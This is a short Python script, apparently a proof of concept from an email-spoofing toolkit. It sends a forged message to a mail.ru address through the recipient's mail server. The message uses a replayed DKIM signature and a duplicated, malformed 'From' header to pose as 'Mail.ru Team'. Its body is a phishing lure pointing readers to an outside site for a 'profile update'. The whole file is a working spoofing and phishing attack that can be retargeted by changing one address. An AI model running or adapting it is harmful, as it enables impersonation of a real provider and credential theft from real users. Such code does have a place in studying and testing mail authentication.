#!/usr/bin/env python
# -*- coding: utf-8 -*-

from common.common import *
from common.mailsender import mailsender

def email_spoof():
    victim_address = b"victimtest8@mail.ru" # replace your victim gmail address here
    mail_server = get_mail_server_from_email(victim_address)

    data =b"""
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=mail.ru; s=mail2;
    h=Date:Message-Id:MIME-Version:Content-Type:Subject:From; bh=lH2Xby0kugfNfaAmikrvN3rp3MA8yBPpoe50gO4pelk=;
    b=ne/NWp2tgDRg3k0SOxyrx/GdbPj/l80D0zUsdh2mWc8O+6HpNVVmVH7928Mn2VKia5Mk9hf7Ehv8R8E32YkjRKkjms9j6aBfKboMfWcFJVgjcz8SzlUA++7G6NCXFZzguVSQYMO69ZxpfzDDuwKMjPFR8q5wzOyQlY/4VxKgGpE=;
From : Mail.ru Team <admin@accounts.mail.ru>
From: <victimtest8@mail.ru>
To: <victimtest8@mail.ru>
Subject: Please update your Mail.ru account profile
Content-Type: multipart/alternative; boundary="001a113db9c28077e7054ee99e9c"
MIME-Version: 1.0
Message-Id: <E1iOE8p-0002bl-Lq.victimtest8-mail-ru@smtp49.i.mail.ru>
Date: Sat, 26 Oct 2019 07:57:33 +0300

--001a113db9c28077e7054ee99e9c
Content-Type: text/plain; charset="UTF-8"

Dear customer,

We require you to complete a profile update at https://hostoftroubles.com. Please understand that this is intended to help protect you and your account. We apologize for any inconvenience. 

Sincerely,
Mail.ru Team

--001a113db9c28077e7054ee99e9c
Content-Type: text/html; charset="UTF-8"

<div>Dear customer,<br><br>We require you to complete a profile update at https://hostoftroubles.com. Please understand that this is intended to help protect you and your account. We apologize for any inconvenience. <br><br>Sincerely,<br>Mail.ru Team</div>

--001a113db9c28077e7054ee99e9c--
    """

    mail_sender = mailsender()
    mail_sender.set_param((mail_server, 25), rcpt_to = b"<"+victim_address+b">", email_data = data.strip(), helo=b"owlhut.com", mail_from= b"<any@owlhut.com>", starttls=True)
    mail_sender.send_email()

if __name__ == '__main__':
    email_spoof()
